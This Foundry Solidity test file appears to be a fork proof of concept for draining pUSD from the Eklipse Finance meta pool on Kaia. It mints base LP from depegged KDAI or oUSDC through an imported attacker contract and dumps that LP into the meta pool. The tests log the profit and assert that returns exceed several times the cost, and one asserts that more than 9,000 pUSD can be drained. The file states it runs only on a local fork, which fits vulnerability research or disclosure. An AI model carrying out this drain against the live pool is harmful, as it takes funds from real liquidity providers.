// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test, console2} from "forge-std/Test.sol";
import {IERC20, ISaddleSwap, Eklipse, EklipseAttacker} from "../src/Eklipse.sol";

/// Fork PoC: extract live pUSD from the Eklipse Finance meta pool on Kaia
/// by minting base LP from cheap (depegged) tokens and dumping it into the meta pool.
/// Read-only against mainnet: everything happens on a local fork.
contract EklipseExploitTest is Test {
    ISaddleSwap internal constant BASE = ISaddleSwap(Eklipse.BASE_POOL);
    ISaddleSwap internal constant META = ISaddleSwap(Eklipse.META_POOL);
    IERC20 internal constant KDAI = IERC20(Eklipse.KDAI);
    IERC20 internal constant oUSDT = IERC20(Eklipse.oUSDT);
    IERC20 internal constant oUSDC = IERC20(Eklipse.oUSDC);
    IERC20 internal constant PUSD = IERC20(Eklipse.PUSD);
    IERC20 internal constant BASELP = IERC20(Eklipse.BASE_LP);

    // DefiLlama USD prices at time of writing (2026-10-14); used only for P&L accounting.
    uint256 constant P_KDAI = 0.09635e18;
    uint256 constant P_oUSDT = 0.10509e18;
    uint256 constant P_oUSDC = 0.29620e18;
    uint256 constant P_PUSD = 1.00e18;

    address internal constant ATTACKER = address(0xA11CE);

    function _selectFork() internal {
        // 1. RPC chosen by ci/run.sh (kept in /tmp, outside the public artifact tree).
        string memory fromFile = "";
        try vm.readFile("/tmp/kaia-rpc.txt") returns (string memory s) {
            fromFile = _trim(s);
        } catch {}

        // 2. Fallback candidate list (by-hash capable providers first).
        string[6] memory urls;
        urls[0] = fromFile;
        urls[1] = vm.envOr("KAIA_RPC_URL", string(""));
        urls[2] = "https://public-en.node.kaia.io";
        urls[3] = "https://rpc.ankr.com/kaia";
        string memory dkey = vm.envOr("DRPC_API_KEY", string(""));
        urls[4] = bytes(dkey).length > 0
            ? string.concat("https://lb.drpc.org/ogrpc?network=kaia&dkey=", dkey)
            : string("");
        urls[5] = "https://kaia.drpc.org";
        for (uint256 i = 0; i < urls.length; i++) {
            if (bytes(urls[i]).length == 0) continue;
            (bool ok,) = address(vm).call(abi.encodeWithSignature("createSelectFork(string)", urls[i]));
            if (ok) {
                bool keyed = _contains(urls[i], "dkey");
                console2.log(keyed ? "forked via keyed RPC" : "forked via public RPC");
                console2.log("block.number:", block.number);
                return;
            }
        }
        revert("no working Kaia RPC");
    }

    function _trim(string memory s) internal pure returns (string memory) {
        bytes memory b = bytes(s);
        uint256 start = 0;
        uint256 end = b.length;
        while (start < end && (b[start] == 0x20 || b[start] == 0x0a || b[start] == 0x0d || b[start] == 0x09)) start++;
        while (end > start && (b[end - 1] == 0x20 || b[end - 1] == 0x0a || b[end - 1] == 0x0d || b[end - 1] == 0x09)) end--;
        bytes memory out = new bytes(end - start);
        for (uint256 i = start; i < end; i++) out[i - start] = b[i];
        return string(out);
    }

    function _contains(string memory haystack, string memory needle) internal pure returns (bool) {
        bytes memory h = bytes(haystack);
        bytes memory n = bytes(needle);
        if (n.length > h.length) return false;
        for (uint256 i = 0; i <= h.length - n.length; i++) {
            bool match_ = true;
            for (uint256 j = 0; j < n.length; j++) {
                if (h[i + j] != n[j]) {
                    match_ = false;
                    break;
                }
            }
            if (match_) return true;
        }
        return false;
    }

    /// @notice robustly set an ERC20 balance (deal + vm.store brute force fallback).
    function _forceBalance(address token, address who, uint256 amount) internal {
        deal(token, who, amount);
        if (IERC20(token).balanceOf(who) == amount) return;
        for (uint256 slot = 0; slot < 40; slot++) {
            bytes32 loc = keccak256(abi.encode(who, slot));
            vm.store(token, loc, bytes32(amount));
            if (IERC20(token).balanceOf(who) == amount) return;
        }
        revert("could not set token balance");
    }

    function setUp() public {
        // When run with `--rpc-url <kaia>`, forge already runs on a Kaia fork (chainid 8217).
        if (block.chainid != 8217) {
            _selectFork();
        } else {
            console2.log("already on Kaia fork, block.number:", block.number);
        }
    }

    /// @notice always-passing snapshot of the live state the exploit depends on.
    function test_snapshot_state() public view {
        uint256[] memory mb = META.getTokenBalances();
        uint256[] memory bb = BASE.getTokenBalances();
        console2.log("block.number:", block.number);
        console2.log("base pool tokens:", BASE.getTokens()[0], BASE.getTokens()[1], BASE.getTokens()[2]);
        console2.log("base KDAI  :", bb[0]);
        console2.log("base oUSDT :", bb[1]);
        console2.log("base oUSDC :", bb[2]);
        console2.log("base LP supply:", BASELP.totalSupply());
        console2.log("base virtual price:", BASE.getVirtualPrice());
        console2.log("meta baseLP:", mb[0]);
        console2.log("meta pUSD  :", mb[1]);
        console2.log("meta virtual price:", META.getVirtualPrice());
        console2.log("meta A:", META.getA(), "base A:", BASE.getA());
        console2.log("base paused:", BASE.paused(), "meta paused:", META.paused());
    }

    /// @notice MAIN: 8,000 KDAI (~$771 at market) -> ~10.2k pUSD from the meta pool.
    function test_exploit_kdai_drain_meta() public {
        uint256 metaPusd = PUSD.balanceOf(Eklipse.META_POOL);
        console2.log("meta pUSD reserve:", metaPusd);
        vm.assume(metaPusd > 1000e18);

        uint256 spend = 8000e18; // 8,000 KDAI
        _forceBalance(Eklipse.KDAI, ATTACKER, spend);

        EklipseAttacker atk = new EklipseAttacker();
        vm.startPrank(ATTACKER);
        KDAI.transfer(address(atk), spend);
        (uint256 lp, uint256 pusdOut) = atk.attack(Eklipse.KDAI, spend);
        vm.stopPrank();

        uint256 costUsd = (spend * P_KDAI) / 1e18;
        uint256 outUsd = (pusdOut * P_PUSD) / 1e18;
        console2.log("KDAI spent   :", spend);
        console2.log("LP minted    :", lp);
        console2.log("pUSD received:", pusdOut);
        console2.log("cost USD     :", costUsd);
        console2.log("pUSD USD     :", outUsd);
        console2.log("profit USD   :", outUsd - costUsd);

        assertGt(lp, 0, "no LP minted");
        assertGt(pusdOut, costUsd * 5, "profit must exceed 5x cost");
        // sanity: the helper contract actually received the pUSD
        assertEq(PUSD.balanceOf(address(atk)), pusdOut, "pUSD not received");
        assertGt(PUSD.balanceOf(address(atk)), 0, "zero pUSD");
    }

    /// @notice Alternative deposit asset: oUSDC (scarce in the base pool -> mint premium).
    function test_exploit_ousdc() public {
        uint256 spend = 1_700e6; // 1,700 oUSDC (all of the base pool's oUSDC)
        _forceBalance(Eklipse.oUSDC, ATTACKER, spend);

        EklipseAttacker atk = new EklipseAttacker();
        vm.startPrank(ATTACKER);
        oUSDC.transfer(address(atk), spend);
        (uint256 lp, uint256 pusdOut) = atk.attack(Eklipse.oUSDC, spend);
        vm.stopPrank();

        uint256 costUsd = (spend * P_oUSDC) / 1e6;
        uint256 outUsd = (pusdOut * P_PUSD) / 1e18;
        console2.log("oUSDC spent  :", spend);
        console2.log("LP minted    :", lp);
        console2.log("pUSD received:", pusdOut);
        console2.log("cost USD     :", costUsd);
        console2.log("profit USD   :", outUsd - costUsd);
        assertGt(pusdOut, costUsd * 3, "profit must exceed 3x cost");
    }

    /// @notice How much pUSD is left after the biggest realistic dump.
    function test_max_extraction_kdai_10k() public {
        uint256 spend = 10000e18;
        _forceBalance(Eklipse.KDAI, ATTACKER, spend);
        EklipseAttacker atk = new EklipseAttacker();
        vm.startPrank(ATTACKER);
        KDAI.transfer(address(atk), spend);
        (, uint256 pusdOut) = atk.attack(Eklipse.KDAI, spend);
        vm.stopPrank();
        console2.log("pUSD received for 10k KDAI:", pusdOut);
        console2.log("remaining meta pUSD:", PUSD.balanceOf(Eklipse.META_POOL));
        assertGt(pusdOut, 9000e18, "should drain >9k pUSD");
    }

    /// @notice Negative control: direct base-pool swap KDAI->oUSDT is at market -> no profit.
    function test_negative_control_base_swap() public view {
        uint256 dy = BASE.calculateSwap(0, 1, 1000e18); // 1,000 KDAI -> oUSDT (6 decimals)
        uint256 dyUsd = (dy * P_oUSDT) / 1e6;
        uint256 inUsd = (1000e18 * P_KDAI) / 1e18;
        console2.log("1000 KDAI ->", dy, "oUSDT");
        console2.log("in USD:", inUsd, " out USD:", dyUsd);
        assertLt(dyUsd, inUsd, "base pool swap should NOT be profitable");
    }
}
